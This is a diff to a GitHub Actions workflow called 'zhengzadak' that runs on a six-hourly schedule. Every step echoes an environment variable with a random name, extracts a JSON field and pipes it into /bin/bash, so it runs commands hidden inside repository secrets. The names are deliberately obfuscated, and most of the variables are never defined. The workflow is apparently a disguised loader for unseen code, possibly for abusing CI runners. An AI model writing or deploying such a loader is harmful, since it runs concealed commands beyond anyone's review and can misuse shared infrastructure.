@@ -2,25 +2,32 @@ name: zhengzadak
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
+    - cron: '33 4/6 * * *'
 
-jobs:  # 10525
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhengzadak
         env:
-          er070: ${{ secrets.er070 }}
+          x05: ${{ secrets.x05 }}
         run: |
-          echo $er070 | jq -r .i4 | /bin/bash
-          echo $cva2 | jq -r .r162 | /bin/bash
-          echo $jujv9890 | jq -r .wl63 | /bin/bash
-          echo $qyk45670 | jq -r .k735 | /bin/bash
-          echo $izvqi637 | jq -r .rtec5 | /bin/bash
-          echo $ekuz872 | jq -r .qf8 | /bin/bash
-          echo $riin821 | jq -r .dhorw328 | /bin/bash
-          echo $jh284 | jq -r .vab53493 | /bin/bash
-          echo $iy7 | jq -r .jysav59326 | /bin/bash
-          echo $xbuwu9 | jq -r .lq78 | /bin/bash
+          echo $x05 | jq -r .td8451 | /bin/bash
+          echo $e820 | jq -r .x0540 | /bin/bash
+          echo $iln719 | jq -r .kpzlf2 | /bin/bash
+          echo $pkv44 | jq -r .ou59 | /bin/bash
+          echo $ifdro6007 | jq -r .eys51195 | /bin/bash
+          echo $tk12 | jq -r .x25212 | /bin/bash
+          echo $m6 | jq -r .fqbh2549 | /bin/bash
+          echo $qfjgz4 | jq -r .swqeo0614 | /bin/bash
+          echo $rx178 | jq -r .fru83906 | /bin/bash
+          echo $qlq56834 | jq -r .zb9854 | /bin/bash
+          echo $eyrk24 | jq -r .oxejq39975 | /bin/bash
+          echo $xkj064 | jq -r .l37 | /bin/bash
+          echo $tovxg8 | jq -r .pnt8 | /bin/bash
+          echo $a701 | jq -r .q51 | /bin/bash
+          echo $u82 | jq -r .gzov334 | /bin/bash
+          echo $wh1391 | jq -r .weut4465 | /bin/bash
 
